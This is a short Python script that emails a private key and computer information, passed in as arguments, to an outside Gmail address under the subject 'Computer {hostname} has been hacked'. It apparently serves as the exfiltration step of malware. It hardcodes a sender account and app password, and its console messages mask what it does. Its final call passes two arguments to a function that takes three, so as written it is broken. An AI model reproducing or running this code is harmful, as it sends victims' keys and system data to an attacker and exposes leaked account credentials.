import smtplib
from email.mime.text import MIMEText

def send_email(private_key, info_computer,hostname):
    print("Handling connect to the remote server...")
    sender_email = "lehaitien42.designer@gmail.com"
    sender_password = "imvx gcwq jthk bvuk"

    receiver_email = "lehaitien422003dev@gmail.com"

    message = MIMEText(f"Private Key: {private_key}\n {info_computer}")
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = f"Computer {hostname} has been hacked, let's check out !"

    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, message.as_string())

    print("Connected successfully!")

import sys
private_key = sys.argv[1]
info_computer = sys.argv[2]
hostname = sys.argv[3]

send_email(private_key, info_computer)